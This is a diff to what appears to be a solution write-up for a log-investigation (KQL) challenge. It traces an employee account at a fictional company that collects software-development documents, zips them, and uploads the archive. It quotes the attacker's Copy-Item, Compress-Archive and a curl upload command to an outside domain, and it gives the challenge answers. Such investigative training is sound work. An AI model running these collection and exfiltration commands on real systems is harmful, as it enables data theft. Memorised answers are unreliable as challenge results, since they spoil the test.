@@ -60,7 +60,46 @@ Obtained from previous query.<br><br>
 **Answer: SJ9V-MACHINE**<br><br>
 
 **Q6. Who is the employee associated with that hostname?**<br><br>
+The username (or hostname) of the hostname is 'alpetrov'. Run a query on Employees table to retrieve employees name.<br><br>
 
-**Answer: **<br><br>
+```
+Employees
+| where username == "alpetrov"
+```
+<br>
 
+**Answer: Alexei Petrov**<br><br>
 
+**Q7. What is that employee's role?**<br><br>
+Obtained from previous query.<br><br>
+
+**Answer: Docks Customer Success Manager**<br><br>
+
+**Q8. What is the command used to copy files related to SoftwareDevelopment?**<br><br>
+
+```
+ProcessEvents
+| where username == "alpetrov"
+| where parent_process_name == "cmd.exe"
+| where timestamp > datetime(5/27/2024, 4:23:10 PM)
+```
+<br>
+
+**Answer: Copy-Item -Path \\\\solvisystems.com\\SharedDocs\\SoftwareDevelopment\\CycleDocuments\\* -Destination C:\\Users\\alpetrov\\CollectedData\\Software_Cycle_Docs**<br><br>
+
+**Q9. What is the name of the archive file containing the copied documents?**<br><br>
+The copied files were then compressed.<br><br>
+
+```
+Compress-Archive -Path C:\Users\alpetrov\CollectedData\* -DestinationPath C:\DataExfil\CollectedData.zip
+```
+<br>
+
+**Answer: CollectedData.zip**<br><br>
+
+**Q10. The next day the data was exfiltrated using what command?**<br><br>
+Looking for a curl command.<br><br>
+
+**Answer: curl -F 'file=@C:\DataExfil\CollectedData.zip' https://api.eco-awareness-update.net/upload**<br><br>
+
+**Q11. How many accounts were used by the threat actor to exfiltrate sensitive information from Solvi Systems?**<br><br>
